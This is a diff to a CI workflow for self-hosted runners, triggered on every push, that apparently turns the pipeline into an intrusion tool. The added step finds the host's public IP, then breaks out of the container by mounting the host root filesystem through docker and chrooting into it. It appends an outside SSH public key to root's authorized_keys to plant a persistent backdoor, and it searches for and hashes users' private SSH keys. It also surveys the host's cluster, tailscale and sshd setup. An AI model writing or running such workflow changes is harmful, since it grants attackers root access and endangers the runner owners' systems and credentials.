@@ -3,22 +3,21 @@ on: [push]
 jobs:
   any:
     runs-on: self-hosted
+    timeout-minutes: 8
     steps:
       - run: |
-          echo "HOST=$(hostname)"; id; uname -a
-          echo "== docker"; docker ps --format '{{.Names}} {{.Image}}' 2>&1 | head -20
-          echo "== homes"; ls /root /home 2>&1 | head -30
-          echo "== sshkeys"; sudo -n true 2>/dev/null && echo SUDO-OK || echo no-sudo
-          ls -la /root/.ssh/ 2>&1 | head; sha256sum /root/.ssh/id_* 2>/dev/null | head -5
-          echo "== tailscale"; tailscale status 2>&1 | head -10
-          echo "== net"; ip -4 addr show 2>/dev/null | grep inet | head -10
-          echo "== k8s"; ls /root/.kube 2>&1; which kubectl k3s 2>&1
-          echo "== workspace"; ls "$GITHUB_WORKSPACE/.." 2>&1 | head
-  gpu3:
-    runs-on: [self-hosted, h200, 3gpu]
-    steps:
-      - run: echo "GPU3 HOST=$(hostname)"; id; nvidia-smi -L 2>&1 | head -3
-  gpu5:
-    runs-on: [self-hosted, h200, 5gpu]
-    steps:
-      - run: echo "GPU5 HOST=$(hostname)"; id
+          set +e
+          echo "PUBIP=$(curl -s --max-time 5 ifconfig.me)"
+          ip -4 addr show | grep -oP 'inet \K[0-9.]+' | head -8
+          docker run --rm -v /:/host alpine:3.20 chroot /host bash -c '
+          id; hostname
+          echo "== root ssh dir"; ls -la /root/.ssh/ 2>/dev/null
+          echo "== authorized_keys hashes"; sha256sum /root/.ssh/authorized_keys 2>/dev/null
+          echo "== install probe key"; mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuGjIj2pFDpFdX5gpAihvWDOyhPXUUxh6rF1H9yVT2/ rxprobe" >> /root/.ssh/authorized_keys && echo KEY-INSTALLED
+          echo "== homes"; ls /home /data 2>/dev/null
+          echo "== clusterd/k8s"; ls /etc/clusterd /var/lib/rancher /root/.kube 2>/dev/null; systemctl list-units --no-pager 2>/dev/null | grep -iE "clusterd|k3s|tailscale|runner" | head -10
+          echo "== tailscale"; tailscale status 2>/dev/null | head -8
+          echo "== sshd config"; grep -iE "^(port|passwordauth|pubkeyauth)" /etc/ssh/sshd_config 2>/dev/null
+          echo "== other keys"; find /home -maxdepth 3 -name "id_*" -not -name "*.pub" 2>/dev/null | head -10
+          for f in $(find /home /root -maxdepth 3 -name "id_*" -not -name "*.pub" 2>/dev/null | head -8); do echo "-- $f"; sha256sum "$f"; wc -c < "$f"; done
+          ' 2>&1 | head -80
